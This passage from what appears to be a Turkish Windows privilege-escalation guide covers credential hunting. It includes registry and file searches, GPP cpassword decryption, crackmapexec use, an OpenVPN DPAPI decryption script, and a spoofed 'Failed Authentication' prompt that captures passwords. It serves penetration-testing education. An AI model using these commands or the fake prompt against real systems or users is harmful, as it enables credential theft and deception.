            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**; çoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarları altında parolayla ilgili değer adlarını tutar. Örneğin, [üreticinin kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış sabit oturum parolasını belirtirdi. Bir değer adı işareti yalnızca inceleme için ipucudur: bu kimlik bilgisini değerlendirirken yüklü sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılıyor olması ve bu hesap için yetkilendirme gerekir. Şifreli verileri ve kurtarılan parolaları rutin numaralandırma çıktısına dahil etmeyin.

### Korumalı sayfaları olan paylaşılan elektronik tablolar

Okunabilir, paylaşılan bir çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesini** çalışma sayfası korumasından veya gizli sütunlardan ayırt edin. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; kapsamlı numaralandırma sırasında olası gizli bilgileri yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin varlığını ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrıca doğrulayın.

### CI sunucusunda saklanan değişiklik yamaları

Bir CI sunucusu, derleme bittikten sonra bile gönderilen kaynak değişikliklerini veri dizininde saklayabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` yolunu uzaktan çalıştırma değişikliklerinin depolandığı yer olarak belgeliyor; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini de kullanan bir betiğe yapılan eklenmiş ya da kaldırılmış başvuruları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı, AES anahtarının yanı sıra şifrelenmiş metin dizgesini de gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin; ardından yetkiniz dahilinde ilgili içeriği inceleyin ve rutin numaralandırma çıktısında gizli bilgileri yazdırmayın. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve gizli bilgileri derleme değişikliklerine eklemekten kaçının.

### Özel yerel yönetici parolası rotasyonu

Özel olarak geliştirilmiş bir parola rotasyon aracı, şifrelenmiş bir yerel yönetici parolasını yerel bir hizmette saklarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında tutabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback üzerinde çalışan bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulama tek başına ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme tohumu veya anahtar malzemesi şifreli metnin yanında erişilebilirse, şifrelemeye güvenmeden önce kullanılan anahtar türetme yöntemini inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak deterministik biçimde AES anahtarı türeten bir şema, bu parolayı korumaya uygun değildir; Go, bu paketin güvenliğe duyarlı rastgelelik için uygun olmadığını belirtiyor. Kurtarılan herhangi bir parolayı bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış görev, `.env` yolu veya şifrelenmiş veri tek başına bu koşullardan hiçbirini kanıtlamaz. Parolaları ve anahtar malzemesini rutin numaralandırma çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. LAPS'in dizin veya Entra tabanlı depolaması ve erişim denetimleri, özel yerel veri deposundan farklıdır; benzer şekilde, [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz olduğunda inceleyin ve kurtarılan gizli bilgileri rutin numaralandırma çıktısına dahil etmeyin. Bir eklenti yolu tek başına gizli bir bilginin var olduğunu kanıtlamaz; kurtarılan bir hizmet parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara erişim sağlayabilir. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı gizli bilgilerle değiştirin. Dizin düzeni için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) göre parolalar düz metin olarak saklanabilir veya bu özellikte tutulan bir anahtarla şifrelenebilir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisi yeniden kullanımını kanıtlar. Yol yalnızca envanter için bir ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin numaralandırma çıktısına dahil etmeyin.

Ayrı olan `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolu için yapılandırılmış portları ve bağlama arayüzünü açığa çıkarabilir. Openfire genellikle yönetici konsolunu loopback arayüzüne bağlar; dinleyici çalışıyorsa yerel bir hesap bu adrese yine de erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme ilkesini ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmetin bağlamında çalışmasını sağlayabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Üreticinin [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` olarak adlandırılan Velociraptor sunucusu yapılandırmaları, iç CA'nın `CA.private_key` anahtarını içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun ya da hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı materyaller içerir; bir istemci yapılandırması bulmak, sunucu CA'sına erişim olduğunu göstermez. Bazı dağıtımlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyaların ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` şeklindedir; farklıysa hizmet için yapılandırılmış yolu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Özel anahtarı günlüklerde veya numaralandırma çıktısında yazdırmaktan kaçının. Üreticinin `config api_client` iş akışı, istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir. Böyle bir rol oluşturmak veya değiştirmek, veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün değilken de mevcut ayrıcalıklı bir sunucu kimliği bir erişim yolu sağlayabilir. Yürütme hakları içeren API sorguları, ilgili sunucu veya aracı bağlamında çalışır ve bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkünse CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda bulunabilir; dışa aktarılmış bir oturum yedeği `sessions-backup.dat` olarak adlandırılmış ve başka bir yerde saklanmış olabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parola ile şifrelendiğini ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebileceğini belirtir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) ise yerel depoyu tanımlar. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı herhangi bir kimlik bilgisinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry'de SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kayıtlı bir SSH key'dir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı SSH key'ler oluşturup bunları `ssh-add` ile eklemeyi ve SSH üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedekleme dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı, hive'ların açığa çıktığını kanıtlamaz ve standart `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanıltıcı sonuçlardır. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) belgelerine bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı dosyayı arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesapları dağıtılmasını sağlayan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPO'lar), herhangi bir etki alanı kullanıcısı tarafından erişilebilir durumdaydı. İkinci olarak, herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenen bu GPP'lerdeki parolalar, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulduğunda, işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkındaki bilgileri içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesinde)_ konumunda arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot'unda Yedek Arşivleri

Sunulan bir webroot içine doğrudan yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir açık olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşiv adı, içinde bir sır bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını göstermez.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini iste

Bunları bilebileceğini düşünüyorsan, kullanıcıdan kendi **kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini bile girmesini isteyebilirsin** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek dosya adları**

Geçmişte **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe uzantısı olmayan dosya adı listesi varyantı

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanlarında genellikle `.psafe3` uzantısı kullanılır. Eşleşen bir dosya adını şifrelenmiş bir kasa adayı olarak değerlendirin; dosyanın varlığı, dosyayı okuyabileceğinizi, kilidini açabileceğinizi veya içinde saklanan kimlik bilgilerini kullanabileceğinizi kanıtlamaz. Bu dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş bir kasa ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası ya da hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce belirtilen hesabı ve NT hash'inin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM yetkisi vermez; uzaktan hizmet erişimi, hesap yetkileri ve ayrı bir hizmet çalıştırma adımı da mevcut olmalıdır. Envanterde veritabanını veya saklanan kimlik bilgilerini yazdırmak yerine kasanın yolunu ve okunabilirlik durumunu bildirin.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe eklentisi olmadan arama komutu varyantı

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Erişilebilir Geri Dönüşüm Kutusu girdilerinde silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden bahseden dosyaları kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve mevcut kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle listenin boş olması kurtarılabilir bir yedek bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir gizli bilgi içerdiğinin kanıtı olarak değil, incelenecek bir aday olarak değerlendirin.

